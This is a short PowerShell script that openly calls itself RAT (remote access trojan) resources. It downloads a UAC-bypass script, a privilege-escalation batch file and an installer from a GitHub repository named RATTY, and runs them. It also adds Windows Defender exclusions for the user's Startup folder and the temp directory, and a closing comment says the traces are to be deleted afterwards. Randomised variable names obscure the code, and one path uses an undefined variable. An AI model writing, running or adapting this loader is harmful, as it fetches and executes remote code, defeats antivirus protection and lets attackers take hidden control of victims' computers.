
# REM DISABLE DEFENDER we use install.ps1 script in COSMO GITHUB REPO
# REM rat resources
# REM you can remove the 'powershell' to get an admin CMd
$uXqvmLVgcR = [System.Net.SecurityProtocolType]'Ssl3,Tls,Tls11,Tls12'
[System.Net.ServicePointManager]::SecurityProtocol = $uXqvmLVgcR
Invoke-WebRequest -Uri "raw.githubusercontent.com/carlocarlo123/RATTY/main/resources/getadpriv.cmd" -OutFile "bGnQSfviwu.cmd"
Invoke-WebRequest -Uri "raw.githubusercontent.com/carlocarlo123/RATTY/main/payloads/resources/UAC.ps1" -OutFile "fyvQVwBMgE.ps1"
.\fyvQVwBMgE.ps1
"bGnQSfviwu.cmd"|cmd
# disable UACMOM
Install-Module -Name PSWindowUpdate -Force
Invoke-WebRequest -Uri "raw.githubusercontent.com/carlocarlo123/RATTY/main/resources/installer.ps1" -OutFile "qjhOmDleBS.ps1"
# This command adds the folder C:\Temp to the exclusion list.\n
# The command disables Windows Defender scheduled and real-time scanning for files in this folder.
Add-MpPreference -ExclusionPath "C:/Users/$lYIbKdtBmp/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/qjhOmDleBS.ps1"
Add-MpPreference -ExclusionPath "$env:temp"
powershell .\qjhOmDleBS.ps1
#after finishing the payload we shall delete every thing

